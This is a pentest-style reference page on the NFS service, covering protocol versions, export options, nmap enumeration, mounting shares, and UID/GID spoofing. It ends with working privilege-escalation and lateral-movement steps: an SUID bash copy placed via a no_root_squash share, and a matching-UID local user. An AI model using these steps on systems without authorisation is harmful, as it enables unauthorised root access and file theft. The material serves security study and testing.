---
title: NFS
description: Network File System
categories: [Services]
tags: [Services, NFS]
weight: 2
---

## Service Info
- Name: Network File System (NFS)
- Purpose: Network Drive
- Listening port: **111 TCP/UDP**, **2049 TCP/UDP**
- OS: Unix-Like

**Network File System (NFS)** is developed by Sun Microsystems in 1984, allowing a user to access files over the network as much like local storage. It builds on the **Open Network Computing Remote Procedure Call (ONC-RPC/SUN-RPC)** that listens on port 111 of both UDP and TCP.

NFS versions:
- NFSv2: Released in March 1989, Operates entirely via UDP
- NFSv3: Released in Jun 1995, includes features such as variable file sizes and better error reporting. Not fully compatible with NFSv2 clients.
- NFSv4: Released in December 2000, only listen on one TCP or UDP port 2049. It uses Kerberos Includes features such as Kerberos, ACLs, state-based operations, as well as performance and security improvements.

NFSv2 and NFSv3 has **no mechanism for authentication**, relying on RPC's options. The most common method is via UNIX UID/GID and group memberships. However, the UID/GID mapping on the client versus the server are not guaranteed to be the same. For example, if user `bob` has UID 1000 on the client, and user `alice` has UID 1000 on the server, `bob` would be able to access files belonging to `alice`. Therefore, NFSv2 and NFSv3 should **only be used in secured local networks**.

NFSv4 has rectified this by using kerberos for authentication. In additional, it also supports **Access Control Lists (ACLs)** and changed from being a **stateless** protocol in NFSv2 and NFSv3 to being a **stateful** protocol. NFSv4 marks a major evolution over the NFSv3. It now has a different, more modern security model.

## NFS Server Configuration
The `/etc/exports` file contains a table of filesystem paths accessible by clients. The default contains comments with example configurations.
```txt
# /etc/exports: the access control list for filesystems which may be exported
#               to NFS clients.  See exports(5).
#
# Example for NFSv2 and NFSv3:
# /srv/homes       hostname1(rw,sync,no_subtree_check) hostname2(ro,sync,no_subtree_check)
#
# Example for NFSv4:
# /srv/nfs4        gss/krb5i(rw,sync,fsid=0,crossmnt,no_subtree_check)
# /srv/nfs4/homes  gss/krb5i(rw,sync,no_subtree_check)
```

Configuration options:
- **rw**: Read and write permissions.
- **ro**: Read only permissions.
- **sync**: Synchronous data transfer. (A bit slower)
- **async**: Asynchronous data transfer. (A bit faster)
- **secure**: Ports above 1024 will not be used.
- **insecure**: Ports above 1024 will be used.
- **no_subtree_check**: This option disables the checking of subdirectory trees.
- **root_squash**: Assigns all permissions to files of root UID/GID 0 to the UID/GID of anonymous, which prevents root from accessing files on an NFS mount.
- **nohide (DANGEROUS)**: Exposes nested mounts, which can unintentionally leak sensitive FS segments.
- **no_root_squash (DANGEROUS)**: All files created by root are kept with the UID/GID 0.

## Footprinting
Nmap scan with default scripts runs `rpcinfo` when rpcbind is found, which retrieves a list of running RPC services, their names and descriptions, as well as the ports they're using.
```shell-session
$ sudo nmap 10.129.14.128 -p111,2049 -sV -sC

Starting Nmap 7.80 ( https://nmap.org ) at 2021-09-19 17:12 CEST
Nmap scan report for 10.129.14.128
Host is up (0.00018s latency).

PORT    STATE SERVICE VERSION
111/tcp open  rpcbind 2-4 (RPC #100000)
| rpcinfo:
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|   100000  3,4          111/udp6  rpcbind
|   100003  3           2049/udp   nfs
|   100003  3           2049/udp6  nfs
|   100003  3,4         2049/tcp   nfs
|   100003  3,4         2049/tcp6  nfs
|   100005  1,2,3      41982/udp6  mountd
|   100005  1,2,3      45837/tcp   mountd
|   100005  1,2,3      47217/tcp6  mountd
|   100005  1,2,3      58830/udp   mountd
|   100021  1,3,4      39542/udp   nlockmgr
|   100021  1,3,4      44629/tcp   nlockmgr
|   100021  1,3,4      45273/tcp6  nlockmgr
|   100021  1,3,4      47524/udp6  nlockmgr
|   100227  3           2049/tcp   nfs_acl
|   100227  3           2049/tcp6  nfs_acl
|   100227  3           2049/udp   nfs_acl
|_  100227  3           2049/udp6  nfs_acl
2049/tcp open  nfs_acl 3 (RPC #100227)
MAC Address: 00:00:00:00:00:00 (VMware)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 6.58 seconds
```

Nmap also includes scripts written to enumerate NFS.
- `nfs-ls` lists the contents of the share
- `nfs-showmount` lists available shares and which clients are allowed to connect
- `nfs-statfs` shows the stats on each share
```shell-session
$ sudo nmap --script nfs* 10.129.14.128 -sV -p111,2049

Starting Nmap 7.80 ( https://nmap.org ) at 2021-09-19 17:37 CEST
Nmap scan report for 10.129.14.128
Host is up (0.00021s latency).

PORT     STATE SERVICE VERSION
111/tcp  open  rpcbind 2-4 (RPC #100000)
| nfs-ls: Volume /mnt/nfs
|   access: Read Lookup NoModify NoExtend NoDelete NoExecute
| PERMISSION  UID    GID    SIZE  TIME                 FILENAME
| rwxrwxrwx   65534  65534  4096  2021-09-19T15:28:17  .
| ??????????  ?      ?      ?     ?                    ..
| rw-r--r--   0      0      1872  2021-09-19T15:27:42  id_rsa
| rw-r--r--   0      0      348   2021-09-19T15:28:17  id_rsa.pub
| rw-r--r--   0      0      0     2021-09-19T15:22:30  nfs.share
|_
| nfs-showmount:
|_  /mnt/nfs 10.129.14.0/24
| nfs-statfs:
|   Filesystem  1K-blocks   Used       Available   Use%  Maxfilesize  Maxlink
|_  /mnt/nfs    30313412.0  8074868.0  20675664.0  29%   16.0T        32000
| rpcinfo:
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|   100000  3,4          111/udp6  rpcbind
|   100003  3           2049/udp   nfs
|   100003  3           2049/udp6  nfs
|   100003  3,4         2049/tcp   nfs
|   100003  3,4         2049/tcp6  nfs
|   100005  1,2,3      41982/udp6  mountd
|   100005  1,2,3      45837/tcp   mountd
|   100005  1,2,3      47217/tcp6  mountd
|   100005  1,2,3      58830/udp   mountd
|   100021  1,3,4      39542/udp   nlockmgr
|   100021  1,3,4      44629/tcp   nlockmgr
|   100021  1,3,4      45273/tcp6  nlockmgr
|   100021  1,3,4      47524/udp6  nlockmgr
|   100227  3           2049/tcp   nfs_acl
|   100227  3           2049/tcp6  nfs_acl
|   100227  3           2049/udp   nfs_acl
|_  100227  3           2049/udp6  nfs_acl
2049/tcp open  nfs_acl 3 (RPC #100227)
MAC Address: 00:00:00:00:00:00 (VMware)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 0.45 seconds
```

## Mounting NFS
We can create a mount on our local filesystem for an NFS share. The protocol abstractions allows us to work on it as if it's part of our filesystem structure. First, we use `showmount` to enumerate available mounts on the server.
{{% alert title="Note" %}}`showmount` relies on the `mountd` RPC call. In modern hardened NFS servers, this is often disabled. If you see nothing returned as a result of the following command, it does not *necessarily* mean there are no shares available. {{% /alert %}}
```shell-session
$ showmount -e 10.129.14.128

Export list for 10.129.14.128:
/mnt/nfs 10.129.14.0/24
```
Then, we create a directory as the mounting point, and then use it to mount the share.
```shell-session
$ mkdir target-NFS
$ sudo mount -t nfs 10.129.14.128:/ ./target-NFS/ -o nolock
$ cd target-NFS
$ tree .

.
└── mnt
    └── nfs
        ├── id_rsa
        ├── id_rsa.pub
        └── nfs.share

2 directories, 3 files
```
When we're done working with the NFS share, we can unmount it to prevent our filesystem from becoming unresponsive.
```bash
sudo umount ./target-NFS
```

## NFS UID/GID Spoofing
NFS servers are configured to trust the `uid` and `gid` of its clients (when Kerberos is not used). We can use this behavior to read and write files as **any UID**, even escalate our existing command execution . However, there are several settings that can change this behavior.
- `all_squash`: Squashes all access mapping every user and group to `nobody`.
    ```shell-session
    $ whoami
    user
    $ touch nfs_share/user.txt
    $ ls -l nfs_share
    -rw-r--r-- 1 nobody nobody   0 Dec  5 16:46 user.txt
    ```
- `root_squash`: Only access with uid 0 (root) is squashed to `nobody`. This is the default configuration on Linux.
    ```shell-session
    $ whoami
    root
    $ touch nfs_share/root.txt
    $ ls -l nfs_share
    -rw-r--r-- 1 nobody nobody   0 Dec  5 16:46 root.txt
    ```
- `no_root_squash`: No squashing, all ownership information are preserved, including files owned by root.
    ```shell-session
    $ whoami
    root
    $ touch nfs_share/root.txt
    $ ls -l nfs_share
    -rw-r--r-- 1 root root   0 Dec  5 16:46 root.txt
    ```
{{% alert title="Note" %}}
When an NFSv4 share is configured to use Kerberos, the NFS server no longer trust clients blindly and verifies their identities via Kerberos service tickets. This configuration would completely remediate ID spoofing attacks. However, NFSv4 configured with Kerberos is uncommon due to the complexity of setting up supporting infrastructure for Kerberos and the performance penalty.
{{% /alert %}}

### Privilege Escalation
If `no_root_squash` is set, we can escalate our existing command execution access to root if we have Read/Write access on the NFS share. This is achieved by creating a copy of `Bash` inside the NFS share with owner set to root and its SUID bit set since `-p` option of `Bash` tells it to execute as the owner of the file if SUID is set.

To conduct this attack, We mount the share as root, then create a root-owned copy of bash inside the share with SUID set. Finally we get a root bash shell when we executed the root SUID copy from the target.
```bash
# On attacker machine as root
mkdir /mnt/nfs
mount -t nfs <target>:<share> /mnt/nfs
cp /bin/bash /mnt/nfs/bash
chmod 4755 /mnt/nfs/bash
```
```bash
# On target machine
./bash -p
```
{{% alert title="Note" %}} If the OS of your machine differs from the server's, there might be a chance the copy of `/bin/bash` from your machine won't run on the server due to different library versions. When this occurs, we can instead copy `/bin/bash` from inside the server to the share directory, then `chown` it as root from our local machine.
{{% /alert %}}

### Lateral Movement
If `no_root_squash` is not enable, we can still escalate our privilege to any non-root user on the system using a method similar to above. The main difference is that we now have to create a user on our local machine with the same UID as the user we want access to on the server.

First we get the UID of the target user on the server.
```shell-session
user@target$ id victim
uid=1111(victim) gid=1111(victim) groups=1111(victim)
```

Next, we create a user on our local machine with the same UID. The `useradd` utility has a `-u` option for us to specify a custom UID. Then we use `sudo` to run a bash shell as that user on our local machine.
```bash
# On Local Machine as a sudo user
sudo useradd -u 1111 victim_local
sudo -u victim_local bash
```
Now, we should be able to follow the rest of the UID/GID spoofing procedure above.
```bash
# On attacker machine as victim_local
mkdir /mnt/nfs
mount -t nfs <target>:<share> /mnt/nfs
cp /bin/bash /mnt/nfs/bash
chmod 4755 /mnt/nfs/bash
```
```bash
# On target machine
./bash -p
```

## References
- [Hacktricks - NFS No Root Squash Misconfiguration Privilege Escalation](https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/nfs-no_root_squash-misconfiguration-pe.html#nfs-no-root-squash-misconfiguration-privilege-escalation)
- [Wikipedia - Network File System](https://en.wikipedia.org/wiki/Network_File_System)
